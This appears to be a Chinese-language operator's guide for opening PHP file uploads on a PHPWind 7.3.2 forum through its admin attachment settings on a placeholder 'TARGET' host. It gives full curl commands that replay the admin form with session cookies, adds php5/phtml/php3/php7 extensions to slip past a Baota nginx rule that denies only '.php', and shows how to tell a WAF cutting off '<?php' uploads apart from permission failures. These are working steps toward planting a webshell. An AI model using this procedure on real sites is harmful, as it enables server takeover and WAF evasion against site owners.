# PHPWind 7.3.2 后台「附件白名单放开」的正确做法（GBK 站点全量表单回放）

## 1. 为什么要全量回放
后台「附件设置」页（/example.com?adminjob=settings&admintype=att，约 29.2KB）有 44 个字段：
config[allowupload]、config[attachhide]、config[attachnum]、config[attachdir](select)、config[ifftp]、
config[watermark]/[ifgif]/[waterwidth]/[waterheight]/[waterpos]/[waterimg]/[watertext]/[waterfonts]/[waterfont]/[watercolor]/[waterpct]/[jpgquality]、
athumbsize[athumbwidth]/[athumbheight]、filetype[] 与 maxsize[] 数组对（成对，一一对应）。
只提交 filetype[] 会丢其它配置 → 必须解析整页表单、原值回放、只改目标字段。

## 2. 两个必踩的坑
- **坑 A：只改 filetype[] 不改配对 maxsize[]** → 前台发帖页显示 `php:0KB`（等于不能传）。必须把同下标的 maxsize[] 也设为 2000。
- **坑 B：GBK 站点直接 utf-8 urlencode** → 中文水印文字等字段被错误转码（且回放会改坏配置）。
  正确做法：**latin-1 字节级往返**——文件用 Latin1 读成字符串做解析、只对 ASCII 值做 EscapeDataString、body 以 ASCII 写盘后 `curl --data-binary @file` 提交。

## 3. 可复现步骤（Windows / PowerShell + curl）
```
# 1) 抓页面（带后台 cookie 与固定 UA；AdminUser cookie 与 UA 绑定）
curl.exe -sk -A "$UA" -b cj.txt -c cj.txt "https://TARGET/example.com?adminjob=settings&admintype=att" -o att.html
# 2) 解析 <form action=...> 内全部 input/select/textarea → pairs（radio/checkbox 只取 checked；select 取 selected）
# 3) 把第一个空 filetype[] 改成 php，并同步其配对 maxsize[] = 2000（或找到已有 php 槽只修 maxsize）
# 4) 生成 urlencoded body（ASCII）→ curl 提交
curl.exe -sk -A "$UA" -b cj.txt -c cj.txt -H "Content-Type: application/x-www-form-urlencoded" --data-binary @body.txt "https://TARGET/example.com?adminjob=settings&admintype=att&verify=<该页 verify>&"
# 5) 验证（前台发帖页会回显白名单）
curl.exe -sk -A "$UA" -b fe_cj.txt "https://TARGET/post.php?fid=2" | iconv -f gbk -t utf-8 | grep 有效文件类型
```
成功判据：`有效文件类型: php:2000KB; gif:2000KB; ...`

## 4. 附带：变体扩展名与保存方式
- 同法把 php5/phtml/php3/php7 一起加进 filetype[]（宝塔 nginx 默认只 deny `\.php$`）。
- config[attachdir]：0=全部同目录 / 1=按版块 / 2=按类型 / 3=按天 / 4=其它；若报"附件目录不可写"可先改成 0 排除"子目录创建失败"，但**若 attachment/ 本身不可写则无解**。

## 5. 关键判据：上传失败到底是哪一层（两个对照实验）
- **纯 txt 附件**：HTTP 200 但正文 `上传附件失败，造成的原因可能有:附件目录不可写(777)、空间在安全模式下、空间大小已不足。` → **业务层问题**（PHPWind 自己判的目录不可写），不是 WAF。
- **含 `<?php` 的附件**：请求体发完后 `curl: (56) schannel: server closed abruptly`、无响应 → **网络层问题**（宝塔 WAF 检测 multipart 里的 PHP 特征后直接断连）。
两者要分开记，否则会误判成"WAF 拦死一切"或"上传功能坏了"。
